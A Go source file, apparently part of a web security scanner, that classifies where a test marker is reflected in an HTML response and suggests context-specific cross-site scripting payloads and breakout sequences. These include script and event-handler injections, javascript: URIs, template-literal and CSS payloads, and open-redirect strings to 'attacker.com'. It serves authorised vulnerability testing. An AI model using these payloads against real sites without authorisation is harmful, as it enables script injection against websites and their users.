package xss

import (
	"io"
	"strings"

	"golang.org/x/net/html"
)

// urlAttrs lists attributes whose values may contain navigable URIs.
// Includes all attrs from the WHATWG Living Standard fetch/navigation specs.
var urlAttrs = map[string]struct{}{
	"href":        {},
	"src":         {},
	"action":      {},
	"formaction":  {},
	"data":        {},
	"poster":      {},
	"codebase":    {},
	"cite":        {},
	"background":  {},
	"manifest":    {},
	"icon":        {},
	"ping":        {},
	"longdesc":    {},
	"usemap":      {},
	"profile":     {},
	"archive":     {},
	"classid":     {},
	"content":     {}, // <meta http-equiv="refresh" content="0; url=MARKER">
	"xmlns":       {},
	"xlink:href":  {},
	"xml:base":    {},
}

// eventHandlers lists attributes that execute JavaScript when triggered.
// Generated from the WHATWG HTML Living Standard § 8.1.8.1 event handlers.
var eventHandlers = map[string]struct{}{
	"onabort":                  {},
	"onafterprint":             {},
	"onauxclick":               {},
	"onbeforeinput":            {},
	"onbeforeprint":            {},
	"onbeforeunload":           {},
	"onblur":                   {},
	"oncancel":                 {},
	"oncanplay":                {},
	"oncanplaythrough":         {},
	"onchange":                 {},
	"onclick":                  {},
	"onclose":                  {},
	"oncontextmenu":            {},
	"oncopy":                   {},
	"oncuechange":              {},
	"oncut":                    {},
	"ondblclick":               {},
	"ondrag":                   {},
	"ondragend":                {},
	"ondragenter":              {},
	"ondragleave":              {},
	"ondragover":               {},
	"ondragstart":              {},
	"ondrop":                   {},
	"ondurationchange":         {},
	"onemptied":                {},
	"onended":                  {},
	"onerror":                  {},
	"onfocus":                  {},
	"onfocusin":                {},
	"onfocusout":               {},
	"onformdata":               {},
	"ongotpointercapture":      {},
	"onhashchange":             {},
	"oninput":                  {},
	"oninvalid":                {},
	"onkeydown":                {},
	"onkeypress":               {},
	"onkeyup":                  {},
	"onload":                   {},
	"onloadeddata":             {},
	"onloadedmetadata":         {},
	"onloadstart":              {},
	"onlostpointercapture":     {},
	"onmessage":                {},
	"onmousedown":              {},
	"onmouseenter":             {},
	"onmouseleave":             {},
	"onmousemove":              {},
	"onmouseout":               {},
	"onmouseover":              {},
	"onmouseup":                {},
	"onoffline":                {},
	"ononline":                 {},
	"onpagehide":               {},
	"onpageshow":               {},
	"onpaste":                  {},
	"onpause":                  {},
	"onplay":                   {},
	"onplaying":                {},
	"onpointercancel":          {},
	"onpointerdown":            {},
	"onpointerenter":           {},
	"onpointerleave":           {},
	"onpointermove":            {},
	"onpointerout":             {},
	"onpointerover":            {},
	"onpointerup":              {},
	"onpopstate":               {},
	"onprogress":               {},
	"onratechange":             {},
	"onreset":                  {},
	"onresize":                 {},
	"onscroll":                 {},
	"onsearch":                 {},
	"onsecuritypolicyviolation": {},
	"onseeked":                 {},
	"onseeking":                {},
	"onselect":                 {},
	"onslotchange":             {},
	"onstalled":                {},
	"onstorage":                {},
	"onsubmit":                 {},
	"onsuspend":                {},
	"ontimeupdate":             {},
	"ontoggle":                 {},
	"ontouchcancel":            {},
	"ontouchend":               {},
	"ontouchmove":              {},
	"ontouchstart":             {},
	"ontransitionend":          {},
	"onunload":                 {},
	"onvolumechange":           {},
	"onwaiting":                {},
	"onwheel":                  {},
	"onanimationend":           {},
	"onanimationiteration":     {},
	"onanimationstart":         {},
}

// executableScriptTypes lists MIME types that browsers will actually execute.
// An empty string means no type attribute was set, which is executable by default.
var executableScriptTypes = map[string]struct{}{
	"":                          {},
	"text/javascript":           {},
	"application/javascript":    {},
	"text/ecmascript":           {},
	"application/ecmascript":    {},
	"module":                    {},
	"text/jscript":              {},
	"text/livescript":           {},
	"text/x-ecmascript":         {},
	"text/x-javascript":         {},
	"application/x-javascript":  {},
	"application/x-ecmascript":  {},
}

// executableURLSinks maps URL attribute → set of tags where dangerous URIs
// (javascript:, vbscript:, data:text/html, etc.) actually execute.
// Other tag+attr combos are classified as ContextAttributeURL only — e.g.
// <img src="javascript:alert(1)"> shows as broken image, doesn't execute.
var executableURLSinks = map[string]map[string]struct{}{
	"href":       {"a": {}, "area": {}},
	"src":        {"iframe": {}, "frame": {}, "embed": {}},
	"action":     {"form": {}},
	"formaction": {"button": {}, "input": {}},
	"data":       {"object": {}},
	"xlink:href": {"a": {}, "use": {}},
}

// dangerousURIPrefixes are URL schemes / data-URI types that execute JS.
var dangerousURIPrefixes = []string{
	"javascript:",
	"vbscript:",
	"data:text/html",
	"data:application/xhtml+xml",
	"data:image/svg+xml",
}

// attributeQuoteContext returns the XSSContext that matches the quote character.
// raw is the raw attribute value as returned by html.Tokenizer (unquoted).
// We recheck the original HTML source to detect the quote style.
func attributeQuoteContext(quoteChar byte) XSSContext {
	switch quoteChar {
	case '"':
		return ContextAttributeDouble
	case '\'':
		return ContextAttributeSingle
	default:
		return ContextAttributeUnquoted
	}
}

// reflectionFinding holds intermediate state for a single discovered reflection.
type reflectionFinding struct {
	ctx           XSSContext
	quoteChar     byte
	attrName      string
	tagName       string
	attrValue     string
	isExecutable  bool
}

// AnalyzeReflectionContext determines the HTML context where the given marker
// is reflected in the response body. It returns a detailed XSSResult with
// payload suggestions.
//
// It uses the golang.org/x/net/html tokenizer (already in go.mod) for robust
// HTML parsing — no regex for structural HTML analysis.
//
// If the marker appears multiple times, the first match is returned. Use
// AnalyzeAllReflections for a full scan.
func AnalyzeReflectionContext(responseBody, marker string) XSSResult {
	results := AnalyzeAllReflections(responseBody, marker)
	if len(results) == 0 {
		return XSSResult{Context: ContextUnknown, Confidence: 0, Explanation: "marker not found in response"}
	}
	// Return the most exploitable finding (lowest context value = highest priority after Unknown)
	best := results[0]
	for _, r := range results[1:] {
		if contextPriority(r.Context) < contextPriority(best.Context) {
			best = r
		}
	}
	return best
}

// contextPriority returns an exploitation priority for a context.
// Lower number = higher priority (more directly exploitable).
func contextPriority(ctx XSSContext) int {
	switch ctx {
	case ContextScript, ContextAttributeEvent:
		return 1
	case ContextAttributeURL, ContextSrcDoc:
		return 2
	case ContextAttributeUnquoted, ContextAttributeDouble, ContextAttributeSingle:
		return 3
	case ContextHTMLBody:
		return 4
	case ContextTemplate:
		return 5
	case ContextJSON:
		return 6
	case ContextStyle, ContextAttributeStyle:
		return 7
	case ContextComment, ContextCDATA:
		return 8
	case ContextScriptData:
		return 9
	default:
		return 100
	}
}

// AnalyzeAllReflections scans the entire response body and returns an XSSResult
// for every location where the marker is reflected.
func AnalyzeAllReflections(responseBody, marker string) []XSSResult {
	if responseBody == "" || marker == "" {
		return nil
	}

	markerLower := strings.ToLower(marker)
	if !strings.Contains(strings.ToLower(responseBody), markerLower) {
		return nil
	}

	findings := scanHTML(responseBody, markerLower, marker)
	if len(findings) == 0 {
		return nil
	}

	results := make([]XSSResult, 0, len(findings))
	for _, f := range findings {
		results = append(results, buildResult(f))
	}
	return results
}

// scanHTML tokenizes the HTML and collects all reflections.
func scanHTML(body, markerLower, markerOriginal string) []reflectionFinding {
	var findings []reflectionFinding

	tokenizer := html.NewTokenizer(strings.NewReader(body))

	var (
		inScript     bool
		inStyle      bool
		scriptIsExec bool
	)

	for {
		tt := tokenizer.Next()
		switch tt {
		case html.ErrorToken:
			if err := tokenizer.Err(); err != nil && err != io.EOF {
				// parse error — return what we have
			}
			return findings

		case html.CommentToken:
			tok := tokenizer.Token()
			data := tok.Data
			if containsMarkerStr(data, markerLower) {
				findings = append(findings, reflectionFinding{
					ctx: ContextComment,
				})
			}

		case html.StartTagToken, html.SelfClosingTagToken:
			tn, hasAttr := tokenizer.TagName()
			tagName := strings.ToLower(string(tn))

			if hasAttr {
				tagFindings, scriptType := scanAttributes(tokenizer, markerLower, tagName, body, markerOriginal)
				findings = append(findings, tagFindings...)
				if tt == html.StartTagToken && tagName == "script" {
					inScript = true
					scriptIsExec = isScriptTypeExecutable(scriptType)
				}
			} else if tt == html.StartTagToken {
				switch tagName {
				case "script":
					inScript = true
					scriptIsExec = true // no type = executable
				case "style":
					inStyle = true
				}
			}

			if tt == html.StartTagToken && tagName == "style" {
				inStyle = true
			}

		case html.EndTagToken:
			tn, _ := tokenizer.TagName()
			switch strings.ToLower(string(tn)) {
			case "script":
				inScript = false
				scriptIsExec = false
			case "style":
				inStyle = false
			}

		case html.TextToken:
			tok := tokenizer.Token()
			data := tok.Data
			dataLower := strings.ToLower(data)
			// Iterate every occurrence of the marker in this text token so that
			// multiple reflections inside a single token are all captured.
			// e.g. `var a="FUZZ"; var b=\`FUZZ\`` contains two distinct contexts.
			searchOffset := 0
			for {
				idx := strings.Index(dataLower[searchOffset:], markerLower)
				if idx < 0 {
					break
				}
				absIdx := searchOffset + idx
				// Extract the segment up to (and including) this occurrence for
				// per-reflection helpers that inspect "what comes before the marker".
				segment := data[:absIdx+len(markerLower)]
				if inScript {
					ctx := ContextScriptData
					if scriptIsExec {
						ctx = ContextScript
						// Refine: is it inside a template literal?
						if isInTemplateLiteral(segment, markerLower) {
							ctx = ContextTemplate
						} else if isJSONContext(segment, markerLower) {
							ctx = ContextJSON
						}
					}
					findings = append(findings, reflectionFinding{
						ctx:          ctx,
						isExecutable: scriptIsExec,
					})
				} else if inStyle {
					findings = append(findings, reflectionFinding{ctx: ContextStyle})
				} else {
					findings = append(findings, reflectionFinding{ctx: ContextHTMLBody})
				}
				searchOffset = absIdx + len(markerLower)
			}

		case html.DoctypeToken:
			// ignore
		}
	}
}

// scanAttributes walks all attributes in a single pass (important: html.Tokenizer's
// TagAttr() is a forward-only, consumable iterator; calling it twice would
// return no attrs the second time).
func scanAttributes(tokenizer *html.Tokenizer, markerLower, tagName, rawBody, markerOriginal string) ([]reflectionFinding, string) {
	var findings []reflectionFinding
	scriptType := ""
	foundFirstType := false

	for {
		key, val, more := tokenizer.TagAttr()
		attrName := strings.ToLower(string(key))
		attrValue := string(val)

		// HTML5 spec: first `type` attribute wins when duplicates exist.
		if attrName == "type" && !foundFirstType {
			scriptType = strings.ToLower(strings.TrimSpace(attrValue))
			foundFirstType = true
		}

		// Check if marker is in the attribute value
		if containsMarkerStr(attrValue, markerLower) {
			quoteChar := detectAttrQuoteChar(rawBody, markerOriginal, attrName)
			ctx, isExec := classifyAttrValueContext(attrName, attrValue, tagName)
			// Refine generic attribute context to track quote style
			if ctx == ContextAttributeDouble {
				switch quoteChar {
				case '\'':
					ctx = ContextAttributeSingle
				case 0:
					ctx = ContextAttributeUnquoted
				// else stays ContextAttributeDouble
				}
			}
			findings = append(findings, reflectionFinding{
				ctx:          ctx,
				quoteChar:    quoteChar,
				attrName:     attrName,
				tagName:      tagName,
				attrValue:    attrValue,
				isExecutable: isExec,
			})
		}

		// Check if marker is in the attribute name (unusual but possible with broken parsers)
		if containsMarkerStr(attrName, markerLower) {
			findings = append(findings, reflectionFinding{
				ctx:      ContextHTMLBody, // attr name injection, treat conservatively
				attrName: attrName,
				tagName:  tagName,
			})
		}

		if !more {
			break
		}
	}

	return findings, scriptType
}

// classifyAttrValueContext determines the XSS context for an attribute value reflection.
// Returns the context and whether it is a directly executable sink.
func classifyAttrValueContext(attrName, attrValue, tagName string) (XSSContext, bool) {
	// Event handler attributes directly execute JS
	if _, ok := eventHandlers[attrName]; ok {
		return ContextAttributeEvent, true
	}

	// Inline style attribute
	if attrName == "style" {
		return ContextAttributeStyle, false
	}

	// srcdoc is a nested HTML document — treat as HTMLBody for payload purposes
	if attrName == "srcdoc" {
		return ContextSrcDoc, true
	}

	// URL attributes
	if _, ok := urlAttrs[attrName]; ok {
		trimmed := strings.TrimSpace(strings.ToLower(attrValue))
		for _, prefix := range dangerousURIPrefixes {
			if strings.HasPrefix(trimmed, prefix) {
				// Only executable if this tag+attr combination is a known executable sink
				if sinkTags, ok := executableURLSinks[attrName]; ok {
					if _, ok := sinkTags[tagName]; ok {
						return ContextScript, true
					}
				}
				// Not executable (e.g. <img src="javascript:...">) but still URL context
				return ContextAttributeURL, false
			}
		}
		return ContextAttributeURL, false
	}

	// Generic attribute — context will be refined by quote detection in buildResult
	return ContextAttributeDouble, false
}

// detectAttrQuoteChar probes the raw HTML source around the marker to determine
// which quote character wraps the attribute value. Returns '"', '\'' or 0 (unquoted).
//
// It searches backward from the reflection position (first occurrence of markerOriginal)
// to find the nearest preceding attrName= and reads its delimiter byte.
// This avoids false positives from other occurrences of the same attribute elsewhere
// in the document.
func detectAttrQuoteChar(rawBody, markerOriginal, attrName string) byte {
	search := attrName + "="
	searchLower := strings.ToLower(search)
	rawLower := strings.ToLower(rawBody)

	// Find the position of the marker in the raw body first.
	markerIdx := strings.Index(rawLower, strings.ToLower(markerOriginal))
	if markerIdx < 0 {
		return '"' // default assumption
	}

	// Search backward: find the last occurrence of attrName= before the marker.
	segment := rawLower[:markerIdx]
	idx := strings.LastIndex(segment, searchLower)
	if idx < 0 {
		return '"' // default assumption
	}
	valueStart := idx + len(search)
	if valueStart >= len(rawBody) {
		return '"'
	}
	ch := rawBody[valueStart]
	if ch == '"' || ch == '\'' {
		return ch
	}
	return 0 // unquoted
}

// isScriptTypeExecutable returns true if the given type is one browsers execute.
// Strips MIME parameters first (e.g. "text/javascript; charset=utf-8").
func isScriptTypeExecutable(scriptType string) bool {
	if i := strings.IndexByte(scriptType, ';'); i != -1 {
		scriptType = strings.TrimSpace(scriptType[:i])
	}
	_, isExec := executableScriptTypes[scriptType]
	return isExec
}

// isInTemplateLiteral returns true when the marker appears to be inside a
// JS template literal (backtick string). This is a best-effort heuristic.
func isInTemplateLiteral(text, markerLower string) bool {
	lower := strings.ToLower(text)
	idx := strings.Index(lower, markerLower)
	if idx < 0 {
		return false
	}
	before := text[:idx]
	backticks := strings.Count(before, "`")
	return backticks%2 == 1
}

// isJSONContext returns true when the marker appears to be inside a JSON structure.
// This is a conservative heuristic: we look for the pattern `: "MARKER"` or `["MARKER"]`
// (colon then quote or open-bracket then quote) in the text around the marker.
// We require both the key-colon pattern AND valid JSON surrounding characters to
// avoid false-positives from JS variable assignments like `var x = "MARKER"`.
func isJSONContext(text, markerLower string) bool {
	lower := strings.ToLower(text)
	idx := strings.Index(lower, markerLower)
	if idx < 0 {
		return false
	}
	before := text[:idx]
	trimmed := strings.TrimSpace(before)
	if len(trimmed) == 0 {
		return false
	}
	// Must see: colon preceded by closing quote (JSON key-value) or array start
	// Pattern: `": "` or `': '` or `["`
	last := trimmed[len(trimmed)-1]
	if last != '"' && last != '\'' && last != '[' {
		return false
	}
	// JSON only uses double quotes. If the value is wrapped in single quotes,
	// this is a JavaScript string or similar context — not valid JSON.
	if last == '\'' {
		return false
	}
	// Additional check: must see a colon (JSON key separator) in the context
	// Avoids matching JS: var x = "MARKER"
	// JSON (RFC 8259) only uses double quotes for strings
	if last == '"' {
		// Look for a colon before the quote that opened the value
		// We search backwards for the opening quote and check there's a : before it
		// Simplified: check for `: "` pattern (JSON only uses double quotes)
		if !strings.Contains(trimmed, ": \"") &&
			!strings.Contains(trimmed, ":{\"") && !strings.Contains(trimmed, ":\"") {
			return false
		}
	}
	return true
}

// containsMarkerStr does a case-insensitive substring check.
// markerLower must already be lowercased by the caller.
func containsMarkerStr(text, markerLower string) bool {
	return strings.Contains(strings.ToLower(text), markerLower)
}

// buildResult converts a reflectionFinding into a full XSSResult with payloads
// and explanation.
func buildResult(f reflectionFinding) XSSResult {
	r := XSSResult{
		Context:       f.ctx,
		AttributeName: f.attrName,
		TagName:       f.tagName,
		IsExecutableSink: f.isExecutable,
	}

	if f.quoteChar != 0 {
		r.QuoteChar = string([]byte{f.quoteChar})
	}

	switch f.ctx {
	case ContextHTMLBody:
		r.Confidence = 0.95
		r.BreakoutSeq = "<"
		r.Payloads = []string{
			`<script>alert(1)</script>`,
			`<img src=x onerror=alert(1)>`,
			`<svg onload=alert(1)>`,
			`<details open ontoggle=alert(1)>`,
			`<body onload=alert(1)>`,
			`"><script>alert(1)</script>`,
		}
		r.Explanation = "Marker is reflected as raw HTML text. Inject HTML tags directly."

	case ContextComment:
		r.Confidence = 0.90
		r.BreakoutSeq = "-->"
		r.Payloads = []string{
			`--><script>alert(1)</script>`,
			`--><img src=x onerror=alert(1)>`,
			`--><svg onload=alert(1)>`,
		}
		r.Explanation = "Marker is inside an HTML comment. Break out with --> then inject."

	case ContextAttributeDouble:
		r.Confidence = 0.92
		r.BreakoutSeq = `"`
		r.QuoteChar = `"`
		r.Payloads = []string{
			`" onmouseover="alert(1)`,
			`"><script>alert(1)</script>`,
			`"><img src=x onerror=alert(1)>`,
			`"><svg onload=alert(1)>`,
			`" autofocus onfocus="alert(1)`,
		}
		r.Explanation = "Marker is in a double-quoted attribute. Break out with \" to inject event handlers or new tags."

	case ContextAttributeSingle:
		r.Confidence = 0.92
		r.BreakoutSeq = `'`
		r.QuoteChar = `'`
		r.Payloads = []string{
			`' onmouseover='alert(1)`,
			`'><script>alert(1)</script>`,
			`'><img src=x onerror=alert(1)>`,
			`' autofocus onfocus='alert(1)`,
		}
		r.Explanation = "Marker is in a single-quoted attribute. Break out with ' to inject event handlers or new tags."

	case ContextAttributeUnquoted:
		r.Confidence = 0.88
		r.BreakoutSeq = " "
		r.Payloads = []string{
			` onmouseover=alert(1)`,
			` autofocus onfocus=alert(1)`,
			`><script>alert(1)</script>`,
			`><img src=x onerror=alert(1)>`,
		}
		r.Explanation = "Marker is in an unquoted attribute. Inject a space to add event handlers or > to break out of tag."

	case ContextAttributeEvent:
		r.Confidence = 0.98
		r.IsExecutableSink = true
		r.Payloads = []string{
			`alert(1)`,
			`alert(document.domain)`,
			`(function(){alert(1)})()`,
		}
		if f.quoteChar == '\'' {
			r.BreakoutSeq = "'"
			r.Payloads = append([]string{`';alert(1);//`, `'+alert(1)+'`}, r.Payloads...)
		} else if f.quoteChar == '"' {
			r.BreakoutSeq = `"`
			r.Payloads = append([]string{`";alert(1);//`, `"+alert(1)+"`}, r.Payloads...)
		}
		r.Explanation = "Marker is in an event handler attribute. This is a direct JavaScript execution sink."

	case ContextAttributeURL:
		r.Confidence = 0.85
		// Only advertise javascript: URI payloads for tag+attr combos that are
		// known executable sinks (e.g. a[href], area[href], form[action]).
		// Inert URL sinks like img[src] and script[src] do not execute javascript:
		// URIs in modern browsers; surfacing those payloads is misleading.
		if f.isExecutable {
			r.IsExecutableSink = true
			r.Payloads = []string{
				`javascript:alert(1)`,
				`javascript:alert(document.domain)`,
				`javascript:void(0);alert(1)`,
			}
			r.Explanation = "Marker is in an executable URL attribute (e.g. a[href]). Try javascript: scheme."
		} else {
			// Non-executable URL sink: offer attribute break-out and open-redirect payloads.
			r.Payloads = []string{
				`//attacker.com/`,
				`https://attacker.com/`,
			}
			r.Explanation = "Marker is in a URL attribute (non-executable sink). Try open-redirect or attribute break-out."
		}
		if f.quoteChar == '"' {
			r.BreakoutSeq = `"`
			r.Payloads = append(r.Payloads,
				`" onmouseover="alert(1)`,
				`"><img src=x onerror=alert(1)>`,
			)
		} else if f.quoteChar == '\'' {
			r.BreakoutSeq = `'`
			r.Payloads = append(r.Payloads,
				`' onmouseover='alert(1)`,
			)
		}

	case ContextAttributeStyle:
		r.Confidence = 0.82
		r.Payloads = []string{
			`}</style><script>alert(1)</script>`,
			`expression(alert(1))`,   // IE-era but sometimes still tested
			`;background:url(javascript:alert(1))`,
			`";}body{background:url("javascript:alert(1)")}`,
		}
		if f.quoteChar == '"' {
			r.BreakoutSeq = `"`
			r.Payloads = append([]string{`" onmouseover="alert(1)`}, r.Payloads...)
		}
		r.Explanation = "Marker is in a style attribute. Try CSS expression() or break out to inject script."

	case ContextScript:
		r.Confidence = 0.97
		r.IsExecutableSink = true
		r.Payloads = []string{
			`;alert(1);//`,
			`</script><script>alert(1)</script>`,
			`\u003cscript\u003ealert(1)\u003c/script\u003e`,
			`;alert(document.domain);//`,
			`'-alert(1)-'`,
			`"-alert(1)-"`,
		}
		r.Explanation = "Marker is in an executable script block. Inject JS directly or close the script block."

	case ContextTemplate:
		r.Confidence = 0.93
		r.IsExecutableSink = true
		r.BreakoutSeq = "`"
		r.Payloads = []string{
			"${alert(1)}",
			"`+alert(1)+`",
			"`;alert(1);//`",
			"${alert(document.domain)}",
		}
		r.Explanation = "Marker is inside a JS template literal. Inject ${alert(1)} or break out of the backtick string."

	case ContextJSON:
		r.Confidence = 0.80
		r.Payloads = []string{
			`</script><script>alert(1)</script>`,
			`","x":"<img src=x onerror=alert(1)>`,
			`\u003cscript\u003ealert(1)\u003c/script\u003e`,
		}
		r.Explanation = "Marker is inside a JSON value in a script block. Try closing the script or Unicode escapes."

	case ContextScriptData:
		r.Confidence = 0.65
		r.Payloads = []string{
			`</script><script>alert(1)</script>`,
			`<img src=x onerror=alert(1)>`,
		}
		r.Explanation = "Marker is in a non-executable script block. The type attribute prevents execution; try closing the block."

	case ContextStyle:
		r.Confidence = 0.78
		r.Payloads = []string{
			`</style><script>alert(1)</script>`,
			`</style><img src=x onerror=alert(1)>`,
			`expression(alert(1))`,
		}
		r.Explanation = "Marker is in a CSS <style> block. Close the block to inject HTML."

	case ContextSrcDoc:
		r.Confidence = 0.90
		r.IsExecutableSink = true
		r.Payloads = []string{
			`<script>alert(1)</script>`,
			`<img src=x onerror=alert(1)>`,
			`&lt;script&gt;alert(1)&lt;/script&gt;`, // HTML-entity encoded version
		}
		r.Explanation = "Marker is in a srcdoc attribute. This is a nested HTML document — inject tags directly (use HTML entities if needed)."

	case ContextCDATA:
		r.Confidence = 0.75
		r.BreakoutSeq = "]]>"
		r.Payloads = []string{
			`]]><script>alert(1)</script>`,
			`]]><img src=x onerror=alert(1)>`,
		}
		r.Explanation = "Marker is inside a CDATA section. Close with ]]> then inject HTML."

	default:
		r.Confidence = 0.5
		r.Payloads = []string{
			`<script>alert(1)</script>`,
			`"><script>alert(1)</script>`,
			`'><script>alert(1)</script>`,
			`javascript:alert(1)`,
		}
		r.Explanation = "Context could not be precisely determined. Try generic payloads."
	}

	// Refine quote-specific context after building the base result
	return r
}
